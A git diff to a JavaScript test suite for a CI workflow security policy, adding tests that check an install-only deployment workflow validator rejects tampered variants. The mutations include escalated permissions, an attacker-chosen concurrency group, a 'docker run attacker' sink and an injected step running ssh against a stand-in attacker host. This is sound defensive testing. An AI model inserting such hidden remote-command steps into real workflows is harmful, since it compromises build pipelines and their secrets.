@@ -5,6 +5,7 @@ import {
   dastReceiptWiringMismatches,
   deploymentPrerequisiteMismatches,
   privilegedWorkflowMismatches,
+  v1InstallOnlyWorkflowMismatches,
 } from "./privileged-workflow-policy.mjs";
 
 const fixtures = [
@@ -12,6 +13,7 @@ const fixtures = [
   [".github/workflows/enterprise-vps-evidence.yml", "vps-host-evidence", false],
   [".github/workflows/enterprise-live-evidence.yml", "production-live-evidence", false],
   [".github/workflows/release-attestation.yml", "github-sigstore-release-evidence", true],
+  [".github/workflows/v1-install-only.yml", "install-v1", true],
 ];
 
 for (const [pathname, jobName, forbidTagTrigger] of fixtures) {
@@ -34,9 +36,38 @@ assert.match(
 );
 
 const deployment = fs.readFileSync(".github/workflows/enterprise-infra.yml", "utf8");
+const installOnly = fs.readFileSync(".github/workflows/v1-install-only.yml", "utf8");
 const infraOps = fs.readFileSync("scripts/infra-ops.mjs", "utf8");
 assert.deepEqual(deploymentPrerequisiteMismatches(deployment), []);
 assert.deepEqual(dastReceiptWiringMismatches(deployment), []);
+assert.deepEqual(v1InstallOnlyWorkflowMismatches(installOnly), []);
+assert.match(
+  v1InstallOnlyWorkflowMismatches(installOnly.replace("github.ref_protected == true", "true")).join(" "),
+  /protected-main/,
+);
+assert.match(
+  v1InstallOnlyWorkflowMismatches(installOnly.replace("      group: infra-production-deploy", "      group: attacker-selected")).join(" "),
+  /serialize/,
+);
+assert.match(
+  v1InstallOnlyWorkflowMismatches(installOnly.replace("  contents: read", "  contents: write")).join(" "),
+  /permissions/,
+);
+assert.match(
+  v1InstallOnlyWorkflowMismatches(installOnly.replace("sh ./scripts/deploy-v1-install-only.sh", "docker run attacker")).join(" "),
+  /fixed install-only sink|Docker boundary/,
+);
+assert.match(
+  v1InstallOnlyWorkflowMismatches(`${installOnly}\n          sh ./scripts/deploy-v1-install-only.sh > "$receipt"\n`).join(" "),
+  /exactly one fixed install-only sink/,
+);
+assert.match(
+  v1InstallOnlyWorkflowMismatches(installOnly.replace(
+    "      - name: Materialize frozen V1 release without activation",
+    "      - name: Hidden remote command\n        run: /usr/bin/ssh attacker.example.invalid id\n      - name: Materialize frozen V1 release without activation",
+  )).join(" "),
+  /frozen candidate-specific controller/,
+);
 assert.match(deploymentPrerequisiteMismatches(deployment.replace("      - dast-zap\n", "")).join(" "), /exact .* prerequisite set/);
 assert.match(
   deploymentPrerequisiteMismatches(deployment.replace("      - release-admission\n", "")).join(" "),
@@ -155,6 +186,7 @@ const expectedBrownfieldOfflineStep = [
   "            scripts/v1-phase-a-authorization.test.mjs \\",
   "            scripts/v1-brownfield-bootstrap.test.mjs \\",
   "            scripts/v1-brownfield-admission.test.mjs \\",
+  "            scripts/v1-brownfield-install-consumer.test.mjs \\",
   "            scripts/v1-install-package.test.mjs \\",
   "            scripts/v1-phase-b-preinstall-authorization.test.mjs \\",
   "            scripts/v1-phase-b-replay-artifacts.test.mjs \\",
@@ -221,7 +253,7 @@ const brownfieldDeploymentStop = deployment.match(
 assert.equal(
   brownfieldDeploymentStop,
   expectedBrownfieldDeploymentStop,
-  "production must contain the exact terminal V1 brownfield stop",
+  "full production activation must retain the exact terminal V1 brownfield stop",
 );
 assert.equal(
   deployment.split("node ./scripts/v1-brownfield-control-plane-gate.mjs apply").length - 1,
@@ -241,11 +273,11 @@ assert.ok(
     && checkoutIndex < brownfieldStopIndex
     && brownfieldStopIndex < firstHandoffIndex
     && firstHandoffIndex < installSshIndex,
-  "the V1 brownfield stop must precede deployment handoffs and SSH material",
+  "the full-activation V1 stop must precede deployment handoffs and SSH material",
 );
 assert.ok(
   brownfieldStopIndex < opsImageIndex,
-  "the V1 brownfield stop must precede every ops-image deployment sink",
+  "the full-activation V1 stop must precede every ops-image deployment sink",
 );
 
 const brokerInvocation = infraOps.match(
@@ -271,5 +303,5 @@ assert.match(
   "Control Center hygiene must include package-owned tests, state, and status suites",
 );
 
-const total = fixtures.length * 3 + 1 + 38;
+const total = fixtures.length * 3 + 1 + 44;
 process.stdout.write(`privileged workflow policy tests passed ${total}/${total}\n`);
